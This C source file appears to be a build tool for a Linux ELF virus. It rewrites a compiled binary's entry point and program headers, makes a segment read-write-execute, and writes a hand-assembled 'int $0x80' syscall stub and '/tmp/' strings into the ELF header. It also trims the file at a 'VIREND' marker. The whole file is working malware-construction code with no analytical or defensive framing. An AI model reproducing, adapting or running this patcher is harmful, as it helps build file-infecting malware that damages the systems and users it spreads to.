#include<stdio.h>
#include<string.h>
#include<fcntl.h>
#include<signal.h>
#include<errno.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#define __USE_UNIX98
#include<unistd.h>

#include<cspatch.h>

int main(void)
{
	int 		h  = open(FILENAME, O_RDWR), i, count = 0;
	unsigned char	buf[6], sp;
	struct {
		off_t	offset;
		size_t	size;
		unsigned char val[32];
	} p[] =
	{  {	0x04, 12, 	{
		0x01, 0x01, 0x01, 0x03,			/* fix OS/ABI	*/
		0x2f, 0x74, 0x6d, 0x70,	0x2f, 0x00,	/* "/tmp/"	*/
		0x2e, 0x00 }				/* "."		*/
	}, {	0x20, 10, 	{
		0x0f, 0xb6, 0xc0,	/* movzbl %al,%eax		*/
		0xcd, 0x80,		/* int    $0x80			*/
		0x83, 0xec, 0x38,	/* sub	  $0x38,%esp		*/
		0xeb, 0x04 }		/* jmp	  1f   			*/
	}, {	0x2e, 6,	{	/* 1:				*/
		0x89, 0x44, 0x24, 0x1c,	/* mov    %eax,0x1c(%esp,1)	*/
		0x61,			/* popa				*/
		0xc3 }			/* ret				*/
	}, {	0, 0, {} }};	

	if (	signal(SIGSEGV, sighnd) == SIG_ERR ||
		signal(SIGTERM, sighnd) == SIG_ERR)
		error("signal");

	if (h < 0)
		error("Unable to open file "FILENAME);
		
	_pread(h, buf, 1, 0xc);
	if (*buf == 0x2f)
		error("Nothing to do!");
		
	for (i = ENTRY; i < lseek(h, -7, 2); i++) {
		_pread(h, buf, 1, i + 7);
		_pwrite(h, buf, 1, i);
	}
	truncate(FILENAME, i);

	for (i = ENTRY; _pread(h, buf, 1, i),*buf >= 0x50 && *buf <= 0x57; i++)
		count++;
	if (count == 0)
		error("Where are my PUSHes?");

	_pread(h, buf, 2, ENTRY + count);
	if ( *(unsigned short *)buf == 0xec83) {
		_pread(h, &sp, 1, ENTRY + count + 2);
		sp += count * 4;
		if (sp > 0x7f)
			error("sub val,%%esp -- val out of range");
	} else
		error("sub ?,%%esp not found!");

	_pread(h, &i, 4, 0x1c);
	if (i != 0x34)
		error("Invalid EHDR size!");
	_pread(h, &i, 4, 0x2a);
	if (i != 0x00010020)
		error("Invalid PHDR size/count!");
	_pread (h, buf, 4, 0x18);
	*(unsigned int*)buf -= (count + 3 + 7);
	_pwrite(h, buf, 4, 0x18); 
	printf("New entry point is at 0x%08x\n", *(unsigned int*)buf);
	count += 3;
	for (i = ENTRY + count; _pread(h, buf, 1, i); i++)
		_pwrite(h, buf, 1, i - count);
	printf("%d+3 bytes has been removed\n", count - 3);

	*(unsigned int *)buf = 7;	/* RWX */
	_pwrite(h, buf, 1, 0x4c);
	
	_pread(h, buf, 4, ENTRY);
	if (*(unsigned int *)buf != 0x24c48360)
		error("Code at entry doesn't match predefined one");
		
	i = TASK_SIZE - 5;
	_pwrite(h, &i, 4, 0x40);
		
	for (i = 0; i < (count = lseek(h, -6, 2)); i++) {
		_pread(h, buf, 6, i);
		if (!strncmp(buf, "VIREND", 6)) {
			printf("Marker found at offset 0x%04x (%d)\n", i, i);
			_truncate(FILENAME, i);
			break;
		}
	}
	if (i >= count)
		error("Marker not found!");
	_pwrite(h, &i, 4, 0x44);
	_pwrite(h, &i, 4, 0x48);
	
	for (i = 0; p[i].offset != 0; i++)
		_pwrite(h, p[i].val, (int)p[i].size, p[i].offset);
		
	for (i = ENTRY; i < ENTRY + 48; i++) {
		_pread(h, buf, 4, i);
		if (buf[0] == 0xeb && buf[2] == 0x83 && buf[3] == 0xec) {
			_pwrite(h, &sp, 1, i + 4);
			printf("0x%02x (%u) bytes allocated in stack\n", sp, sp);
			i = -1;
			break;
		}
	}
	if (i != -1)
		error("jmp ? / sub ?, %%esp not found");

	_close(h);		
	return 0; /* NOTREACHED */
}

void error(char *msg)
{
	fprintf(stderr, "%s\n", msg);
	_exit(2);
}

void sighnd(int sig)
{
	fprintf(stderr,	"Got signal %d. Exiting...\n", sig);
	_exit(2);
}
